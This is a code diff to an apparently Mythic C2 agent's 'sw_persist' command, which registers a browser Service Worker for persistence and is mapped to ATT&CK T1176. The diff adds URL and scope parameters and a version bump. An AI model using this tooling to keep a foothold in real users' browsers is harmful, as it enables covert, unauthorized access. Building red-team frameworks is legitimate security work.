@@ -16,6 +16,24 @@ class SwPersistArguments(TaskArguments):
                 default_value="install",
                 description="Action: install (register SW), status (list registrations), remove (unregister all)",
             ),
+            CommandParameter(
+                name="url",
+                type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(
+                    required=False
+                )],
+                default_value="",
+                description="Same-origin URL of the service worker JS file to register (required for install)",
+            ),
+            CommandParameter(
+                name="scope",
+                type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(
+                    required=False
+                )],
+                default_value="/",
+                description="Scope path for the service worker registration (default: /)",
+            ),
         ]
 
     async def parse_arguments(self):
@@ -33,8 +51,8 @@ class SwPersistCommand(CommandBase):
     cmd = "sw_persist"
     needs_admin = False
     help_cmd = "sw_persist"
-    description = "Attempt to register a Service Worker for persistence across page reloads. Requires HTTPS. Supports install/status/remove actions."
-    version = 1
+    description = "Register a Service Worker for persistence across page reloads. Requires HTTPS and a same-origin SW script URL. Use status to list existing registrations, remove to unregister all."
+    version = 2
     author = "@grampae"
     attackmapping = ["T1176"]
     argument_class = SwPersistArguments
@@ -44,7 +62,11 @@ class SwPersistCommand(CommandBase):
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         action = task.args.get_arg("action") or "install"
-        task.display_params = action
+        url = task.args.get_arg("url") or ""
+        if action == "install" and url:
+            task.display_params = "install {}".format(url)
+        else:
+            task.display_params = action
         return task
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
